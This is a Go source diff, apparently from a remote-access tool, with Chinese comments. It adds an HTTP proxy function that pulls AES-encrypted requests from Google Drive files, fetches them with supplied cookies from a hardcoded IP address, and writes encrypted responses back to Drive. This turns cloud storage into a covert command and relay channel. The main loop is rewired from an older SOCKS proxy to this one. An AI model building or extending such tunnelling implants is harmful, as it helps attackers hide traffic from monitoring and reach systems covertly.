@@ -14,6 +14,8 @@ import (
 	"./toolkits"
 	"github.com/op/go-logging"
 	"os"
+	"net/http"
+	"encoding/json"
 )
 
 var ver = "080704"
@@ -211,10 +213,91 @@ func socksCreate(srv *drive.Service, serverId string, fileId string)  {
 	srv.Files.Delete(outputId).Do()
 }
 
+// httpProxy 97.107.137.127
+func httpProxy(srv *drive.Service, serverId string, fileId string) {
+	//var target net.Conn
+	var outputId string
+	urlRoot := "http://97.107.137.127"
+
+	// 读取http请求
+	response, err := srv.Files.Get(fileId).Download()
+	if err != nil {
+		log.Error("download error:", err)
+		return
+	}
+	content, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	response.Body.Close()
+	recvData := toolkits.AesDecrypt(content, key)
+	log.Debug(string(recvData))
+	newReq := map[string]string{}
+	err = json.Unmarshal(recvData, &newReq)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+
+	url := urlRoot + newReq["path"]
+
+	reqest, err := http.NewRequest("GET", url, nil)
+	//增加header选项
+	if len(newReq["cookie"])>0 {
+		reqest.Header.Add("Cookie", newReq["cookie"])
+	}
+	//reqest.Header.Add("User-Agent", "xxx")
+	//reqest.Header.Add("X-Requested-With", "xxxx")
+
+	// 处理返回结果
+	client := &http.Client{}
+	response, err = client.Do(reqest)
+	if err != nil {
+		log.Debug("http error", err.Error())
+	}
+
+	// 获取HTML
+	htmlContent, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		log.Fatal(err)
+	}
+	response.Body.Close()
+
+	// 创建输出数据文件
+	newFile := &drive.File{
+		Name:     serverId + ".output",
+		MimeType: "application/octet-stream",
+		AppProperties: map[string]string{
+			"typ": "data",
+		},
+	}
+
+	// 加密数据
+	tempMedia := bytes.NewBuffer(htmlContent)
+	sendData := toolkits.AesEncrypt(tempMedia.Bytes(), toolkits.MessageKey)
+	sendMedia := bytes.NewBuffer(sendData)
+
+	// 写入数据到输出文件
+	nf, _ := srv.Files.Create(newFile).Media(sendMedia).Do()
+	outputId = nf.Id
+	log.Debug("send to", outputId)
+
+	// 更新输入数据文件
+	newFile = &drive.File{
+		Description: outputId, // 把回应的ID放到这个字段
+		AppProperties: map[string]string{
+			"typ": "data",
+		},
+	}
+	messageMedia := bytes.NewBuffer(nil)
+	srv.Files.Update(fileId, newFile).Media(messageMedia).Do()
+
+	return
+}
+
 func main() {
 	// 获取主机ID
-	//serverId := "201cc0a4e7b594ccd147ff2e6cad9cdf"
-	serverId := getClientId()
+	serverId := "201cc0a4e7b594ccd147ff2e6cad9cdf"
+	//serverId := getClientId()
 
 	// init log config
 	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
@@ -239,9 +322,40 @@ func main() {
 	//}()
 
 	// socks proxy
+	//go func() {
+	//	for {
+	//		indexName := serverId + ".socket"
+	//		queryString := fmt.Sprintf("name='%s'", indexName)
+	//		r, err := srv.Files.List().Q(queryString).
+	//			Fields("files(id, name, size)").Do()
+	//		if err != nil {
+	//			log.Error("Unable to retrieve files", err)
+	//			break
+	//		}
+	//
+	//		//log.Debug("recv", len(r.Files))
+	//		for _, i := range r.Files {
+	//			// 更新数据文件，防止重入
+	//			newFile := &drive.File{
+	//				Name: serverId + ".input",
+	//			}
+	//			srv.Files.Update(i.Id, newFile).Do()
+	//
+	//			// 处理数据
+	//			go socksCreate(srv, serverId, i.Id)
+	//			//time.Sleep(time.Duration(1)*time.Second)
+	//			//socksCreate(srv, i.Id)
+	//		}
+	//		time.Sleep(time.Duration(3)*time.Second)
+	//	}
+	//
+	//	os.Exit(0)
+	//}()
+
+	// http proxy
 	go func() {
 		for {
-			indexName := serverId + ".socket"
+			indexName := serverId + ".hpp"
 			queryString := fmt.Sprintf("name='%s'", indexName)
 			r, err := srv.Files.List().Q(queryString).
 				Fields("files(id, name, size)").Do()
@@ -259,7 +373,7 @@ func main() {
 				srv.Files.Update(i.Id, newFile).Do()
 
 				// 处理数据
-				go socksCreate(srv, serverId, i.Id)
+				go httpProxy(srv, serverId, i.Id)
 				//time.Sleep(time.Duration(1)*time.Second)
 				//socksCreate(srv, i.Id)
 			}
